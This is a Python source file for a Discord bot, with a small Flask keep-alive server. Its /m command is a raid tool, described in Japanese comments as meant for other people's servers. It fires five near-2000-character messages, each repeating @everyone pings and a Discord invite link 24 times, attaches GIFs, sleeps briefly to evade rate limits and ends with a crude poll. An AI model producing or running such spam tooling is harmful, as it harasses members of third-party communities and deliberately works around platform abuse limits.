import os
import threading
from datetime import timedelta
import asyncio
import discord
from discord.ext import commands
from discord import app_commands
from flask import Flask

# --- 1. Flask（簡易Webサーバー）の設定 ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- 2. Discord Botの設定 ---
intents = discord.Intents.default()
intents.message_content = True 
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Successfully synced {len(synced)} command(s).")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

# 投票オブジェクトを作成するヘルパー関数
def create_salmon_poll(question_text: str) -> discord.Poll:
    poll = discord.Poll(
        question=question_text,
        duration=timedelta(hours=1)
    )
    poll.add_answer(text="さーもん万歳！(1)", emoji="💩")
    poll.add_answer(text="さーもん万歳！(2)", emoji="🐟")
    return poll

# /m コマンド（他人のサーバー用：外部アプリの限界火力版）
@bot.tree.command(name="m", description="画像と投票、大量のメンションと招待URLを限界まで送信します")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(text="投票のタイトルや画像と一緒に送るメッセージ")
async def send_m(interaction: discord.Interaction, text: str = "さーもん万歳！"):
    # 最初のレスポンスを保留
    await interaction.response.defer(thinking=True)

    # 💡 ご指定の招待URL（https://discord.gg/V2gX5KJT7e）を組み込んだメッセージの塊を作成
    # 1つの塊が約80文字になり、それを24回繰り返すことで1920文字の巨大テキストにします（制限2000文字の限界値）
    single_block = "@everyone サーモンの集い！！さーもん万歳！ https://discord.gg/V2gX5KJT7e \n\n"
    heavy_content = single_block * 24 

    mention_setting = discord.AllowedMentions(everyone=True, users=True, roles=True)

    image_files = ["acc4d0a0.gif", "a62e0a5b.gif"]
    existing_files = [f for f in image_files if os.path.exists(f)]

    # 💡 外部アプリの回数制限（最大数エラー）に引っかからない安全な最大値「5回」
    target_count = 5 

    for i in range(target_count):
        try:
            files_obj = [discord.File(f) for f in existing_files] if existing_files else []
            
            # メッセージ（大量の改行、everyone、新しい招待URL入り）を送信
            if files_obj:
                await interaction.followup.send(content=heavy_content, files=files_obj, allowed_mentions=mention_setting)
            else:
                await interaction.followup.send(content=heavy_content, allowed_mentions=mention_setting)
            
            # レートリミット（速度制限）を回避するために少し待つ
            await asyncio.sleep(0.8)

        except Exception as e:
            print(f"爆撃送信エラー (ループ {i+1}回目): {e}")
            if "maximum number of follow up messages" in str(e):
                break

    # 最後に1回だけ投票を添えて締めくくる
    try:
        poll_obj = create_salmon_poll(text)
        await interaction.followup.send(poll=poll_obj)
    except Exception as poll_err:
        print(f"最終投票の送信失敗: {poll_err}")

# --- 3. 起動処理 ---
if __name__ == "__main__":
    web_thread = threading.Thread(target=run_web)
    web_thread.daemon = True
    web_thread.start()

    token = os.environ.get("DISCORD_TOKEN")
    bot.run(token)
